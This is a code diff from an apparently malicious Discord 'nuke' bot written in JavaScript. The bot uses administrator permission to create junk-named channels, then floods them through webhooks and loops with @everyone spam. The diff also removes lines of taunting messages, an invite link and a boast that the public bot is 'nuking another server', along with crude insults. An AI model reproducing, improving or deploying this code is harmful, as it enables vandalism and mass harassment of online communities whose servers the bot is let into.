@@ -280,9 +280,26 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
        if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
         var number = 0
         var pray = -1
-        msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(c => c.send("https://discord.gg/z6jMqF5Yjn @everyone (also wait 7 seconds for the spam)").then(c.send("@everyone all hail me").then(c.send(" @everyone rip webhook spam shitcord killed it(oh also if the bot is slow its probably bcs its nuking another server remember this is a public bot and may be overloaded)").then(c.send("kiss my disrespectful ass")))))
         setTimeout(() => { 
-        while(pray < 2) {
+           msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
+                p.send("@everyone all hail me")
+                p.createWebhook("assy").then(w => {
+                         
+                    [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                        w.send(randomT() + " @everyone")
+                        
+                    
+                    })
+                
+                })
+                var spam = 0
+                while(spam < 15) 
+            {    
+                p.send(randomT() + " @everyone")
+                spam++
+            }
+             })
+          while(pray < 2) {
          msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
             p.createWebhook("assy").then(w => {
                      
